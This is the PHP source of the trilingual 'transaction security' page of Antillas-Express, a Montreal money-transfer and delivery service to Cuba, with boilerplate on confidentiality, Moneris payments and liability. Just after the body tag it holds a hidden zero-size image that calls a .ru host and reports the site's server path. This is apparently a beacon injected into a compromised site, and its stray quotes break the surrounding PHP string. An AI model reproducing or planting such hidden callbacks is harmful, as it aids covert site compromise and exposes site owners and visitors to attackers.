<?php
include('lib/config.php');


echo 
"<html>
	<head>
		<title>Antillas-express - Montreal to Cuba - ".$param['telephone_client']."</title
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<meta name='description' content='".$txt['MetaDescription']."'>
		<meta name='keywords' content='".$txt['MetaKeyword']."'>
		<link href='styles/style.css' rel='stylesheet' type='text/css'>
		<base target='MAIN'>
	</head>
<body><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
	<table bgcolor='#EFEFEF' width='$Large' cellpadding='12' cellspacing='0' align='$Enligne' border='0' >		
		<tr>
			<td>";
?>

 <?if ($_SESSION['langue']=="fr"){?>
			<blockquote> 
              <p><span class="TitleRed"><br>
                S&eacute;curit&eacute; des transactions</span> </p>
              <p class="normalText">&Eacute;tablie &agrave; Montr&eacute;al, <span class="normalTextBold">Antillas-Express</span> 
                offre des services financiers desservant Cuba qui s&#8217;ajoutent 
                &agrave; ses activit&eacute;s de livraison, messagerie, communication 
                et vente de produits de consommation courante.</p>
              <p class="normalText">On a d&eacute;velopp&eacute; une relation 
                d&#8217;affaires tr&egrave;s personnalis&eacute;e aupr&egrave;s 
                de la client&egrave;le depuis nos d&eacute;buts en 1993. Les transactions 
                s&#8217;effectuent de fa&ccedil;on rapide et s&eacute;curitaire. 
                Confidentialit&eacute; et discr&eacute;tion sont assur&eacute;es. 
                En 2004, <span class="normalTextBold">Antillas-Express</span> 
                a lanc&eacute; une nouvelle version du site Internet permettant 
                de r&eacute;aliser vos transactions en ligne en tout temps et 
                partout dans le monde</p>
              <p class="normalText">Détenteur d'un Certificat de marchand Internet, <span class="normalTextBold">www.antillas-express.com</span> fait usage des plus récentes innovations technologiques en matière de commerce électronique. Elle a en effet adopté la solution d'affaires (transaction, validation du crédit et paiement en ligne) développée par le groupe Moneris </p>
              <p class="normalText">Vous &ecirc;tes responsable du maintien de 
                la confidentialit&eacute; de votre nom d'utilisateur et de votre 
                mot de passe. <span class="normalTextBold">Antillas-Express</span> 
                ne pourra &ecirc;tre tenue responsable d'un usage non autoris&eacute; 
                de votre compte. Dans le cas o&ugrave; la confidentialit&eacute; 
                de ces renseignements viendrait &agrave; &ecirc;tre compromise, 
                veuillez en avertir notre service &agrave; la client&egrave;le 
                le plus t&ocirc;t possible afin d'&eacute;viter une &eacute;ventuelle 
                utilisation frauduleuse de votre identit&eacute;. </p>
              <p><span class="normalTextBold">Antillas-Express</span><span class="normalText"> 
                ne sera pas tenue responsable pour toute perte ou dommage r&eacute;sultant 
                notamment du non-respect des mesures de s&eacute;curit&eacute; 
                &eacute;nonc&eacute;es ci-haut. </span></p>
              <span class="normalText"></span></blockquote>
<?} else if ($_SESSION['langue']=="en"){?>
			<blockquote> 
              <p><span class="TitleRed"><br>
                Transactions security</span></p>
              <p class="normalText">Settled down in Montreal, <span class="normalTextBold">Antillas-Express</span> 
                offers financial services to Cuba that you/they are annexed to 
                their delivery activities, messaging, communication and sale of 
                products of daily consumption. </p>
              <p class="normalText">We have developed a commercial relationship 
                very personalized with regard to our clientele from our beginnings 
                in 1993. The transactions are made in a quick and sure way. Confidentiality 
                and discretion are assured. In the year 2004, <span class="normalTextBold">Antillas-Express</span> 
                has thrown a new version of the internet site allowing carrying 
                out on-line transactions in all time and from any part of the 
                world. </p>
              <p class="normalText">Possessor of merchant's internet certificate, 
                <span class="normalTextBold">www.antillas-express.com</span> uses the 
                most recent technologic innovations in e-commerce. Indeed, we 
                adopted the business solution (transaction, validation of the 
                credit and on-line payment) developed by group Moneris. </p>
              <p class="normalText">You are responsible for maintaining the confidentiality 
                of your user name and of our access key. <span class="normalTextBold">Antillas-Express</span> 
                won't be made responsible of a not authorized use of your account. 
                In the case that the confidentiality of your personal data could 
                be compromised, notice as soon as possible to our customer service 
                in order to avoid an eventual fraudulent use of your identity. 
              </p>
              <p class="normalText"><span class="normalTextBold">Antillas-Express</span> 
                won't be made responsible by all loss or damage resulting from 
                not taking into account the security measures enunciated above.</p>
            </blockquote>
<?} else {?>
				<blockquote> 
              <p><span class="TitleRed"><br>
                Seguridad de las transacciones </span> </p>
              <p class="normalText">Establecida en Montreal, <span class="normalTextBold">Antillas-Express</span> 
                ofrece servicios financieros con destino a Cuba que se anexan 
                a sus actividades de entrega, mensajer&iacute;a, comunicaci&oacute;n 
                y venta de productos de consumo cotidiano.</p>
              <p class="normalText">Hemos desarrollado una relaci&oacute;n comercial 
                muy personalizada con respecto a nuestra clientela desde nuestros 
                comienzos en 1993. Las transacciones se efect&uacute;an de manera 
                r&aacute;pida y segura. Confidencialidad y discreci&oacute;n est&aacute;n 
                aseguradas. En el a&ntilde;o 2004, <span class="normalTextBold">Antillas-Express</span> 
                ha lanzado una nueva versi&oacute;n del sitio internet permitiendo 
                realizar transacciones en l&iacute;nea en todo tiempo y desde 
                cualquier parte del mundo.</p>
              <p class="normalText">Poseedor de un certificado de comerciante 
                internet, <span class="normalTextBold">www.antillas-express.com</span> 
                utiliza las m&aacute;s recientes innovaciones tecnol&oacute;gica 
                sen materia de comercio electr&oacute;nico. En efecto, hemos adoptad 
                ola soluci&oacute;n de negocio (transacci&oacute;n, validaci&oacute;n 
                del cr&eacute;dito y pago en l&iacute;nea) desarrollada por grupo 
                Moneris.</p>
              <p class="normalText">Usted es responsable de mantener la confidencialidad 
                de su nombre de usuario y de su clave de acceso. <span class="normalTextBold">Antillas 
                Express</span> no podr&aacute; ser responsabilizada de un uso 
                no autorizado de su cuenta. En el caso que la confidencialidad 
                de sus datos personales pudieran verse comprometidos, advierta 
                a nuestro servicio a la clientela lo m&aacute;s pronto posible 
                a fin de evitar una eventual utilizaci&oacute;n fraudulenta de 
                vuestra identidad.</p>
              <p><span class="normalTextBold">Antillas-Express</span><span class="normalText"> 
                no ser&aacute; responsabilizada por toda p&eacute;rdida o da&ntilde;o 
                resultante del no respeto del as medidas de seguridad enunciadas 
                m&aacute;s arriba.</span> </p>
            </blockquote>
<?}?>

			</td>
		</tr>
	  	<tr> 
	    	<td>
				<?php include("bas_page.inc"); ?>
			</td>
	  	</tr>
	</table>
<script language='JavaScript1.2'>
	function Rafraichie(){
		window.location.reload();
		//	 str = 'securite.php'; 
		//	 open(str,'_self','status=no,toolbar=no,menubar=no,location=no,resizable=no' );
	} // Rafraichie
</script>

</body>
</html>